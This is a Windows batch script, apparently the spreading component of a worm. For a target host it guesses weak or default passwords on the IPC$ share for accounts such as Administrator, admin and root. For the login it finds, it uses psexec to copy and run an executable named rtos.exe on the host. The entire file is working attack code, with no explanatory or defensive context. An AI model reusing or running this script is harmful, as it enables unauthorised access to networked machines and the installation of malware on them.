@echo off
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto asp1
net use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto asp2
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto asp3
net use \\%1\ipc$ "admin123" /user:Administrator
if not errorlevel 1 goto asp4
net use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto asp5
net use \\%1\ipc$ "secret" /user:Administrator
if not errorlevel 1 goto asp6
net use \\%1\ipc$ "mail" /user:Administrator
if not errorlevel 1 goto asp7
net use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto asp8
net use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto asp9
net use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto asp10
net use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto asp11
net use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto asp12
net use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto asp13
net use \\%1\ipc$ "password123" /user:Administrator
if not errorlevel 1 goto asp14
net use \\%1\ipc$ "123" /user:Administrator
if not errorlevel 1 goto asp15
net use \\%1\ipc$ "321" /user:Administrator
if not errorlevel 1 goto asp16
net use \\%1\ipc$ "12345" /user:Administrator
if not errorlevel 1 goto asp17
net use \\%1\ipc$ "54321" /user:Administrator
if not errorlevel 1 goto asp18
net use \\%1\ipc$ "12345abc" /user:Administrator
if not errorlevel 1 goto asp19
net use \\%1\ipc$ "123456" /user:Administrator
if not errorlevel 1 goto asp20
net use \\%1\ipc$ "654321" /user:Administrator
if not errorlevel 1 goto asp21
net use \\%1\ipc$ "abc123" /user:Administrator
if not errorlevel 1 goto asp22
net use \\%1\ipc$ "red123" /user:Administrator
if not errorlevel 1 goto asp23
net use \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto asp24
net use \\%1\ipc$ "asdf" /user:Administrator
if not errorlevel 1 goto asp25
net use \\%1\ipc$ "asdfghjkl" /user:Administrator
if not errorlevel 1 goto asp26
net use \\%1\ipc$ "qwertyuiop" /user:Administrator
if not errorlevel 1 goto asp27
net use \\%1\ipc$ "" /user:admin
if not errorlevel 1 goto asp28
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto asp29
net use \\%1\ipc$ "" /user:root
if not errorlevel 1 goto asp30
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto asp31
net use \\%1\ipc$ "" /user:test
if not errorlevel 1 goto asp32
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto asp33
net use \\%1\ipc$ "" /user:Server
if not errorlevel 1 goto asp34
net use \\%1\ipc$ "Server" /user:Server
if not errorlevel 1 goto asp35
:asp1
psexec \\%1 -u Administrator -p "" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "" -d rtos.exe -o
goto aspending
:asp2
psexec \\%1 -u Administrator -p "Administrator" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "Administrator" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "Administrator" -d rtos.exe -o
goto aspending
:asp3
psexec \\%1 -u Administrator -p "admin" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "admin" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "admin" -d rtos.exe -o
goto aspending
:asp4
psexec \\%1 -u Administrator -p "admin123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "admin123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "admin123" -d rtos.exe -o
goto aspending
:asp5
psexec \\%1 -u Administrator -p "changeme" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "changeme" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "changeme" -d rtos.exe -o
goto aspending
:asp6
psexec \\%1 -u Administrator -p "secret" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "secret" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "secret" -d rtos.exe -o
goto aspending
:asp7
psexec \\%1 -u Administrator -p "mail" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "mail" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "mail" -d rtos.exe -o
goto aspending
:asp8
psexec \\%1 -u Administrator -p "test" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "test" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "test" -d rtos.exe -o
goto aspending
:asp9
psexec \\%1 -u Administrator -p "test123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "test123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "test123" -d rtos.exe -o
goto aspending
:asp10
psexec \\%1 -u Administrator -p "temp" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "temp" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "temp" -d rtos.exe -o
goto aspending
:asp11
psexec \\%1 -u Administrator -p "temp123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "temp123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "temp123" -d rtos.exe -o
goto aspending
:asp12
psexec \\%1 -u Administrator -p "pass" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "pass" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "pass" -d rtos.exe -o
goto aspending
:asp13
psexec \\%1 -u Administrator -p "password" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "password" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "password" -d rtos.exe -o
goto aspending
:asp14
psexec \\%1 -u Administrator -p "password123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "password123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "password123" -d rtos.exe -o
goto aspending
:asp15
psexec \\%1 -u Administrator -p "123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "123" -d rtos.exe -o
goto aspending
:asp16
psexec \\%1 -u Administrator -p "321" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "321" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "321" -d rtos.exe -o
goto aspending
:asp17
psexec \\%1 -u Administrator -p "12345" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "12345" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "12345" -d rtos.exe -o
goto aspending
:asp18
psexec \\%1 -u Administrator -p "54321" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "54321" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "54321" -d rtos.exe -o
goto aspending
:asp19
psexec \\%1 -u Administrator -p "12345abc" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "12345abc" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "12345abc" -d rtos.exe -o
goto aspending
:asp20
psexec \\%1 -u Administrator -p "123456" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "123456" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "123456" -d rtos.exe -o
goto aspending
:asp21
psexec \\%1 -u Administrator -p "654321" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "654321" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "654321" -d rtos.exe -o
goto aspending
:asp22
psexec \\%1 -u Administrator -p "abc123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "abc123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "abc123" -d rtos.exe -o
goto aspending
:asp23
psexec \\%1 -u Administrator -p "red123" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "red123" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "red123" -d rtos.exe -o
goto aspending
:asp24
psexec \\%1 -u Administrator -p "qwerty" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "qwerty" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "qwerty" -d rtos.exe -o
goto aspending
:asp25
psexec \\%1 -u Administrator -p "asdf" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "asdf" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "asdf" -d rtos.exe -o
goto aspending
:asp26
psexec \\%1 -u Administrator -p "asdfghjkl" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "asdfghjkl" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "asdfghjkl" -d rtos.exe -o
goto aspending
:asp27
psexec \\%1 -u Administrator -p "qwertyuiop" -d attrib.exe -r rtos.exe
psexec \\%1 -u Administrator -p "qwertyuiop" -f -c -d rtos.exe -o
psexec \\%1 -u Administrator -p "qwertyuiop" -d rtos.exe -o
goto aspending
:asp28
psexec \\%1 -u admin -p "" -d attrib.exe -r rtos.exe
psexec \\%1 -u admin -p "" -f -c -d rtos.exe -o
psexec \\%1 -u admin -p "" -d rtos.exe -o
goto aspending
:asp29
psexec \\%1 -u admin -p "admin" -d attrib.exe -r rtos.exe
psexec \\%1 -u admin -p "admin" -f -c -d rtos.exe -o
psexec \\%1 -u admin -p "admin" -d rtos.exe -o
goto aspending
:asp30
psexec \\%1 -u root -p "" -d attrib.exe -r rtos.exe
psexec \\%1 -u root -p "" -f -c -d rtos.exe -o
psexec \\%1 -u root -p "" -d rtos.exe -o
goto aspending
:asp31
psexec \\%1 -u root -p "root" -d attrib.exe -r rtos.exe
psexec \\%1 -u root -p "root" -f -c -d rtos.exe -o
psexec \\%1 -u root -p "root" -d rtos.exe -o
goto aspending
:asp32
psexec \\%1 -u test -p "" -d attrib.exe -r rtos.exe
psexec \\%1 -u test -p "" -f -c -d rtos.exe -o
psexec \\%1 -u test -p "" -d rtos.exe -o
goto aspending
:asp33
psexec \\%1 -u test -p "test" -d attrib.exe -r rtos.exe
psexec \\%1 -u test -p "test" -f -c -d rtos.exe -o
psexec \\%1 -u test -p "test" -d rtos.exe -o
goto aspending
:asp34
psexec \\%1 -u Server -p "" -d attrib.exe -r rtos.exe
psexec \\%1 -u Server -p "" -f -c -d rtos.exe -o
psexec \\%1 -u Server -p "" -d rtos.exe -o
goto aspending
:asp35
psexec \\%1 -u Server -p "Server" -d attrib.exe -r rtos.exe
psexec \\%1 -u Server -p "Server" -f -c -d rtos.exe -o
psexec \\%1 -u Server -p "Server" -d rtos.exe -o
goto aspending
:aspending